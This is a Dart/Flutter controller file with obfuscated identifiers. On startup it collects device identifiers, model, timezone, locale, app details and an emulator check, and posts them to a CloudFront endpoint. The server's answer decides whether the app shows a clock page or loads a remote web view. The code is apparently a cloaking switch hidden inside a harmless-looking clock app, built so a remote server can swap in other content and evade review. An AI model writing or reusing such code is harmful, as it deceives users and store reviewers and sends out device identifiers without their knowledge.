import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class HandelLogic extends GetxController {

  var xlmtvun = RxBool(false);
  var vftwebodnp = RxBool(true);
  var wvcamr = RxString("");
  var rlcqmdza = RxBool(false);
  var gesimbf = RxBool(true);
  final xiydlnrae = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    ociltz();
  }


  Future<void> ociltz() async {
    rlcqmdza.value = true;
    gesimbf.value = true;
    vftwebodnp.value = false;

    xiydlnrae.post("https://d118mlfl9v0w47.cloudfront.net/OILEUW?no_check",data: await zaneyfmiqd()).then((value) {
      var stnir = value.data["stnir"] as String;
      var mfuskb = value.data["mfuskb"] as bool;
      if (mfuskb) {
        wvcamr.value = stnir;
        vdrfxk();
      } else {
        gpfuqkh();
      }
    }).catchError((e) {
      vftwebodnp.value = true;
      gesimbf.value = true;
      rlcqmdza.value = false;
    });
  }

  Future<Map<String, dynamic>> zaneyfmiqd() async {
    final DeviceInfoPlugin lrfapxiv = DeviceInfoPlugin();
    PackageInfo fujokram_qmiea = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var ibtdvem = Platform.localeName;
    var rkv_qaFnThb = currentTimeZone;

    var rkv_mqYkc = fujokram_qmiea.packageName;
    var rkv_Sutk = fujokram_qmiea.version;
    var rkv_xhoQawt = fujokram_qmiea.buildNumber;

    var rkv_PAshDB = fujokram_qmiea.appName;
    var rkv_jwos = "";
    var rkv_TXBd  = "";
    var rkv_rOCKnm = "";
    var dquwfpmj = "";
    var kxzqghuv = "";
    var ktsj = "";
    var ydrwjhs = "";
    var zhxig = "";
    var jwyz = "";


    var rkv_GPlZAVBf = "";
    var rkv_hDWfGlx = false;

    if (GetPlatform.isAndroid) {
      rkv_GPlZAVBf = "android";
      var jtkamvb = await lrfapxiv.androidInfo;

      rkv_rOCKnm = jtkamvb.brand;

      rkv_jwos  = jtkamvb.model;
      rkv_TXBd = jtkamvb.id;

      rkv_hDWfGlx = jtkamvb.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      rkv_GPlZAVBf = "ios";
      var pzrjkms = await lrfapxiv.iosInfo;
      rkv_rOCKnm = pzrjkms.name;
      rkv_jwos = pzrjkms.model;

      rkv_TXBd = pzrjkms.identifierForVendor ?? "";
      rkv_hDWfGlx  = pzrjkms.isPhysicalDevice;
    }

    var res = {
      "rkv_PAshDB": rkv_PAshDB,
      "rkv_xhoQawt": rkv_xhoQawt,
      "rkv_Sutk": rkv_Sutk,
      "rkv_mqYkc": rkv_mqYkc,
      "rkv_jwos": rkv_jwos,
      "rkv_qaFnThb": rkv_qaFnThb,
      "rkv_rOCKnm": rkv_rOCKnm,
      "rkv_TXBd": rkv_TXBd,
      "ibtdvem": ibtdvem,
      "rkv_GPlZAVBf": rkv_GPlZAVBf,
      "rkv_hDWfGlx": rkv_hDWfGlx,
      "dquwfpmj" : dquwfpmj,
      "kxzqghuv" : kxzqghuv,
      "ktsj" : ktsj,
      "ydrwjhs" : ydrwjhs,
      "zhxig" : zhxig,
      "jwyz" : jwyz,

    };
    return res;
  }

  Future<void> gpfuqkh() async {
    Get.offNamed("/ClockMainPage");
  }

  Future<void> vdrfxk() async {
    Get.offNamed("/Outreload");
  }

}
